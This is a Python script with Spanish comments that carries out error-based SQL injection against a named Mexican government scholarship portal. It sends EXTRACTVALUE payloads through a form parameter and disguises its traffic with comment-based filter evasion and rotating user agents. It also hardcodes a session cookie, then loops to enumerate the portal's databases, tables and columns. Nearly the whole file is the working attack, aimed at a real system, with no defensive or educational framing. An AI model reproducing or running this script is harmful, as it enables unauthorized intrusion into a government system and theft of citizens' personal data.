import requests
import random
import re
import binascii

# Configuración
URL = "https://subes.becasbenitojuarez.gob.mx/class/perfil/selects.php"
RAW_COOKIES = "PHPSESSID=55aj0tp7241hlabn08p1hvpi5a; sto-id-47873-Pool-SUBES=FBIDBHKMFAAA; _ga_HPRYEXEF25=GS2.1.s1770593532$o1$g0$t1770593692$j60$l0$h0; _ga=GA1.3.1768993372.1770593532; _gid=GA1.3.57041770.1770593533; _gat=1"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def get_random_agent():
    return random.choice(USER_AGENTS)

def string_to_hex(s):
    return "0x" + binascii.hexlify(s.encode()).decode()

def tamper(payload):
    # Evasión: Reemplazar espacios con comentarios SQL
    return payload.replace(" ", "/**/")

def make_request(sql_query):
    # Construcción del payload Error-Based (EXTRACTVALUE)
    # 0x7e es '~'
    # Limitamos a 32 caracteres por la restricción de EXTRACTVALUE, 
    # pero para nombres suele ser suficiente.
    injection = f"022 AND EXTRACTVALUE(1,CONCAT(0x7e,({sql_query}),0x7e))--"
    
    # Aplicar tamper
    injection_tampered = tamper(injection)
    
    headers = {
        "Host": "subes.becasbenitojuarez.gob.mx",
        "Cookie": RAW_COOKIES,
        "User-Agent": get_random_agent(),
        "Accept": "text/html, */*; q=0.01",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": "https://subes.becasbenitojuarez.gob.mx",
        "Referer": "https://subes.becasbenitojuarez.gob.mx/perfil/informacion_domicilio/"
    }
    
    data = {
        "caso": "6",
        "municipio": injection_tampered,
        "selected": "62123",
        "estado": "14"
    }
    
    try:
        response = requests.post(URL, headers=headers, data=data, timeout=10)
        
        # Buscar el error XPATH
        match = re.search(r"XPATH syntax error: '~(.*?)~'", response.text)
        if match:
            return match.group(1)
        return None
    except Exception as e:
        print(f"[!] Error de conexión: {e}")
        return None

def main():
    print("[*] Iniciando enumeración de base de datos...")
    
    # 1. Obtener Base de Datos actual
    current_db = make_request("SELECT database()")
    print(f"\n[+] Base de Datos Actual: {current_db}")
    
    if not current_db:
        print("[-] No se pudo obtener la base de datos actual. Saliendo.")
        return

    # 2. Listar todas las bases de datos
    print("\n[*] Enumerando Bases de Datos disponibles...")
    dbs = []
    i = 0
    while True:
        # information_schema.schemata
        db_name = make_request(f"SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET {i}")
        if not db_name:
            break
        dbs.append(db_name)
        print(f"    - {db_name}")
        i += 1
    
    # 3. Listar tablas y columnas para cada DB (O solo la actual si son muchas)
    # Por eficiencia, preguntaremos al usuario o lo haremos para la actual y 'subes' si existe
    target_dbs = [current_db] # Nos enfocamos en la actual para el demo
    
    for db in target_dbs:
        print(f"\n[*] Enumerando tablas para la base de datos: {db}")
        db_hex = string_to_hex(db)
        
        tables = []
        j = 0
        while True:
            table_name = make_request(f"SELECT table_name FROM information_schema.tables WHERE table_schema={db_hex} LIMIT 1 OFFSET {j}")
            if not table_name:
                break
            tables.append(table_name)
            print(f"    [T] {table_name}")
            
            # 4. Listar columnas de la tabla
            columns = []
            k = 0
            while True:
                col_name = make_request(f"SELECT column_name FROM information_schema.columns WHERE table_name={string_to_hex(table_name)} AND table_schema={db_hex} LIMIT 1 OFFSET {k}")
                if not col_name:
                    break
                columns.append(col_name)
                print(f"        (C) {col_name}")
                k += 1
            
            j += 1

if __name__ == "__main__":
    main()
